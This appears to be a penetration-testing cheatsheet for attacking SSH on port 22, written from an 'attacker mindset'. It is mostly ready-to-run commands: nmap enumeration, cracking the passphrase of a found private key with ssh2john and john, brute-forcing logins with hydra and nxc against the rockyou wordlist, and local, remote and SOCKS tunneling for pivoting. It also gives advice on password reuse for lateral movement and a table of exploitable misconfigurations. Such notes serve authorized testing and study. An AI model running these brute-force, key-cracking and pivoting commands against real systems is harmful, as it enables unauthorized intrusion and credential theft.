# SSH (22)

[[09 - Service Cheatsheets/00 - README|Folder index]]

## Attacker Mindset

Secure shell. Usually hardened but worth probing. Default creds on embedded devices and forgotten Linux boxes are common. If open externally, check for old versions (OpenSSH < 7.x = username enumeration via CVE-2018-15473). If you have any cred from elsewhere, try it here — password reuse is the #1 lateral-movement vector on Linux. Think: **lateral movement, tunneling, key theft**. **Common attack vectors:** brute force (Hydra/Medusa), username enumeration, SSH tunneling, stolen key reuse, CVE-based exploits on older versions.

## Enumerate

```bash
nmap -sV -sC -p 22 $IP
ssh $IP  # grab banner
```

## Connect

```bash
ssh user@$IP
ssh -i id_rsa user@$IP
ssh -p 2222 user@$IP           # non-standard port
ssh -o StrictHostKeyChecking=no user@$IP
```

## Key-based auth

```bash
# If you find id_rsa
chmod 600 id_rsa
ssh -i id_rsa user@$IP

# Crack passphrase-protected key
ssh2john id_rsa > hash.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

## Brute-force

```bash
hydra -l user -P /usr/share/wordlists/rockyou.txt ssh://$IP -t 4
nxc ssh $IP -u users.txt -p passwords.txt
```

## SSH tunneling

```bash
# Local port forward (access remote service through local port)
ssh -L 8080:127.0.0.1:80 user@$IP

# Dynamic SOCKS proxy
ssh -D 1080 user@$IP

# Remote port forward
ssh -R 4444:127.0.0.1:4444 user@$IP
```

## Common misconfigs

| Finding | Impact |
| --- | --- |
| Password auth enabled (no key-only) | Brute-forceable |
| Root login permitted | Direct root access if creds found |
| Weak keys / small key size | Key factorization |
| SSH agent forwarding | Agent hijacking on compromised host |
